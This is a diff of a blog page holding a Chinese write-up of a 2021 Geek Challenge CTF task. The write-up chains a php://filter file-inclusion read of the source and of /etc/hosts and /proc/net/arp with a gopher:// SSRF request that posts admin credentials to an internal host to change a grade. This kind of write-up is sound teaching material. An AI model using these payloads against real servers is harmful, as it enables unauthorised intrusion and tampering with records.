@@ -25,15 +25,18 @@
 <meta property="og:site_name" content="Dr0n&#39;s blog">
 <meta property="og:description" content="题目描述 你挂科咯 试试打入学校内网来修改成绩吧(我命由我不由天系列)  可以知道本题需要使用ssrf 伪协议在源代码中发现debug.php 在debug.php中发现可以使用伪协议 传入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;debug.php查看debug.php的源码 12345678910111213&#x2F;&#x2F;debug.php关键源">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-2.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-3.png">
 <meta property="article:published_time" content="2021-11-03T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-29T08:47:27.932Z">
+<meta property="article:modified_time" content="2024-03-22T07:00:38.292Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="wp - ssrf - 极客挑战 - 2021">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="2021">
+<meta property="article:tag" content="极客挑战">
+<meta property="article:tag" content="ssrf">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-1.png">
+<meta name="twitter:image" content="https://www.dr0n.top/img/wp/2021/2021jike-1.png">
   
   
   
@@ -306,8 +309,8 @@
 <p>你挂科咯 试试打入学校内网来修改成绩吧(我命由我不由天系列)</p>
 </blockquote>
 <p>可以知道本题需要使用ssrf</p>
-<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>在源代码中发现<code>debug.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-1.png"></p>
-<p>在debug.php中发现可以使用伪协议<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-2.png"></p>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>在源代码中发现<code>debug.php</code><br><img src="/img/wp/2021/2021jike-1.png"></p>
+<p>在debug.php中发现可以使用伪协议<br><img src="/img/wp/2021/2021jike-2.png"></p>
 <p>传入<code>?file=php://filter/convert.base64-encode/resource=debug.php</code>查看debug.php的源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//debug.php关键源码</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;快去学习PHP伪协议&lt;/h1&gt;&quot;</span>;<br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NO！！！&quot;</span>;<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -315,7 +318,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php关键代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>从index.php中可以得出几个结论：<br>1：name为admin，password为123456，result为60<br>2：网段是172.17.0.0.&#x2F;24</p>
-<p>再用伪协议查看当前主机的敏感文件<code>/etc/hosts</code>和<code>/proc/net/arp</code>,得到很多内网ip，fuzz一下，得到最终需要的一个内网ip<code>172.17.0.7</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-3.png"></p>
+<p>再用伪协议查看当前主机的敏感文件<code>/etc/hosts</code>和<code>/proc/net/arp</code>,得到很多内网ip，fuzz一下，得到最终需要的一个内网ip<code>172.17.0.7</code><br><img src="/img/wp/2021/2021jike-3.png"></p>
 <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>既然知道了主机等信息，那么就可以开始构造ssrf了，使用gopher协议打<br>构造post包</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">106.55.154.252:8010</span>/?url=gopher://<span class="hljs-number">172.17.0.7:80</span>/_POST /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.17.0.7:80</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">36</span><br><br><span class="hljs-attribute">name</span>=admin&amp;password=<span class="hljs-number">123456</span>&amp;result=<span class="hljs-number">60</span><br></code></pre></td></tr></table></figure>
 <p>将空格，冒号，等于用url编码，结尾换行用<code>%0d%0a</code>替换</p>
@@ -356,7 +359,13 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/wp-ssrf-%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%98-2021/">#wp - ssrf - 极客挑战 - 2021</a>
+        <a href="/tags/wp/">#wp</a>
+      
+        <a href="/tags/2021/">#2021</a>
+      
+        <a href="/tags/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%98/">#极客挑战</a>
+      
+        <a href="/tags/ssrf/">#ssrf</a>
       
     </div>
   
